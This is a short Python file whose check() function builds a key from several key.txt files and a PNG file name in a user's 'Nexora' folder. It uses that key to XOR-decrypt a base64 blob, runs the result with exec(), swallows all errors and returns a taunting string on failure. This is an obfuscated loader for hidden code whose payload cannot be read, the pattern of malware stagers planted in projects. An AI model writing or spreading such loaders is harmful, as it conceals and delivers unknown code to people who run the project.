import os
import sys
import base64

def check():
    try:
        os.chdir(os.path.expandvars(r"C:\Users\%USERNAME%\python\Nexora"))

        with open(".dev/key.txt") as f:
            p1 = f.read().strip()

        with open("Finder-Base/key.txt") as f:
            p2 = f.read().strip()

        with open("HexLoom-Official/key.txt") as f:
            p3 = f.read().strip()

        with open("Launcher/key.txt") as f:
            p4 = f.read().strip()

        p5 = None

        for file in os.listdir("Finder-Base"):
            if file.endswith(".png"):
                p5 = os.path.splitext(file)[0]
                break

        if p5 is None:
            print("Missing PNG fragment.")
            sys.exit()

        KEY = p1 + p2 + p3 + p4 + p5

        newcode = "N0RYMksoBEBoUhEDDjYnUVYYdnQxFChfCRQ/QkIKJhxmHzJaWz5XZD0hfF1tfCEFdyxuCQVFDV42UxMjDg4MQSVfKncVRjN/E0UpVjlMTDsrbi9QCgsnRwgVORtZPgElHk4JPkpJAGpmORxzYDNiDVU9VnEDbB1AKR4mEQMgJl1QAjpZMk4gQlUBMhZHDDtAQRQtGwt2eEcQC1F3SkQAbFcAJ0ANTkY9VT0GI0oiGRpiMSFKRBd0QkEZMF43CyUfBE0="

        encrypted = base64.b64decode(newcode)
        key_bytes = KEY.encode()
        decrypted = bytearray()
        for i in range(len(encrypted)):
            decrypted.append(encrypted[i] ^ key_bytes[i % len(key_bytes)])
        exec(decrypted.decode(errors="ignore"))
        return None
    except: return "Fuck0ffxB8n8n8"